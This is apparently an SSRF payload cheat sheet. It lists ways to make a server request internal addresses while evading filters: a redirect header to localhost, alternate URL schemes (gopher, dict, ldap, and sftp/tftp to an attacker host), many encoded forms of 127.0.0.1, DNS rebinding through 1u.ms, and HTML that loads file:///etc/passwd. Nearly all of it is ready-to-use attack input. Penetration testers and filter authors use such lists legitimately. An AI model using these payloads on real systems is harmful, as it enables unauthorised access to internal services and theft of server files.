## Add location field in response header from server request.

```
HTTP/1.1 301 Moved Permanently
Server: nginx
Connection: close
Content-Length: 0
Location: http://127.0.0.1
```
## Use different URL scheme

```
file://path/to/file
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
dict://127.0.0.1:1337/stats
ftp://127.0.0.1/
sftp://attacker-website.com:1337/
tftp://attacker-website.com:1337/TESTUDPPACKET
ldap://127.0.0.1:389/%0astats%0aquit
ldaps://127.0.0.1:389/%0astats%0aquit
ldapi://127.0.0.1:389/%0astats%0aquit
gopher://attacker-website.com/_SSRF%0ATest!
```


## Use different IP address format

Dotted hexadecimal IP

```
0x7f.0x0.0x0.0x1
```
Dotless hexadecimal IP

```
0x7f001
```

Dotless hexadecimal IP with padding (padding is 0a0b0c0d)

```
0x0a0b0c0d7f000001
```

Dotless decimal IP 

```
2130706433
```


Dotted decimal IP with overflow (256)

```
383.256.256.257
```

Dotted octal IP

```
0177.0.0.01
```


Dotless octal IP

```
017700000001
```

Dotted octal IP with padding

```
00177.000.0000.000001
```


## Short-hand IP address

```
0.0.0.0 => 0
127.0.0.1 => 127.1
127.0.0.1 => 127.0.1
```


## IPv4 address mapping

```
[::ffff:7f00:1]
[::ffff:127.0.0.1]
[::127.0.0.1]
[::ffff:7f00:1%25]
[::ffff:127.0.0.1%eth0]
```


## Enclosed alphanumerics

```
127。0。0。1
127｡0｡0｡1
127．0．0．1
⑫７｡⓪．𝟢。𝟷
𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
⁰𝔁𝟳𝙛𝟢０１
２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
𝟢₁𝟳₇｡０｡０｡𝟢𝟷
𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
[::𝟏②₇．𝟘．₀．𝟷]
[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
𝟎𝚇𝟕𝖋｡⓪｡𝟣
𝟎ˣ𝟩𝘍｡𝟷
𝟘𝟘①𝟕⑦．１
⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
```
## DNS Pining [1u.ms](http://1u.ms/)

Single record
```
dig A make-127-0-0-1-rr.1u.ms
```

Multiple record

```
dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
```

## Server-side processing of arbitrary HTML and JS

```
<iframe src="file:///etc/passwd" width="400" height="400">
<img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
```
